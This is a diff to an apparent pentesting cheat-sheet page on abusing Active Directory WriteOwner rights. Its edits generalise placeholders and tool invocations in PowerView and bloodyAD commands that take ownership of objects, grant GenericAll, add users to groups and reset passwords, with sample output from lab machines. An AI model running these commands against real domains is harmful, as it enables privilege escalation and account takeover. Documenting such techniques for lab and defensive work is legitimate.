@@ -4,7 +4,7 @@ date: 2024-7-27
 tags: ["Writeowner", "Permissions", "Powerview", "Impacket", "AddMember", "Domain Controller", "Active Directory", "Windows", "Dacledit"]
 ---
 
-### Abuse #1 : Change owner of the group
+### Abuse #1 : Change Owner of the Group/User
 
 {{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
@@ -16,7 +16,7 @@ sudo ntpdate -s <DC> && powerview '<DOMAIN>/<USER>:<PASSWORD>@<TARGET_DOMAIN>'
 ```
 
 ```console
-Set-DomainObjectOwner -TargetIdentity '<GROUP>' -PrincipalIdentity '<TARGET_USER>'
+Set-DomainObjectOwner -TargetIdentity '<TARGET>' -PrincipalIdentity '<TARGET_USER>'
 ```
 
 {{< /tabcontent >}}
@@ -35,7 +35,7 @@ Set-DomainObjectOwner -TargetIdentity '<GROUP>' -PrincipalIdentity '<TARGET_USER
 #### 2. Change owner
 
 ```console
-Set-DomainObjectOwner -Identity '<GROUP>' -OwnerIdentity '<TARGET_USER>'
+Set-DomainObjectOwner -Identity '<TARGET>' -OwnerIdentity '<TARGET_USER>'
 ```
 
 ```console {class="sample-code"}
@@ -94,7 +94,7 @@ bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add genericAll '
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
+$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add genericAll 'NETWORK AUDIT' 'm.lovegod' 
 [+] m.lovegod has now GenericAll on NETWORK AUDIT
 ```
 
@@ -151,11 +151,11 @@ Password for [WORKGROUP\m.lovegod]:
 {{< tabcontent set2-2 tab2 >}}
 
 ```console
-python3 bloodyAD.py -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
+bloodyAD -k -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>'
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -k -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
+$ bloodyAD -k -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
 [+] m.lovegod added to NETWORK AUDIT
 ```
 
@@ -323,11 +323,11 @@ Mandatory Label\High Mandatory Level          Label            S-1-16-12288
 {{< tabcontent set3 tab1 >}}
 
 ```console
-python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
+bloodyAD -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>'
 ```
 
 ```console {class="sample-code"}
-$ python3 bloodyAD.py -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234'
+$ bloodyAD -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234'
 [+] Password changed successfully!
 ```
 
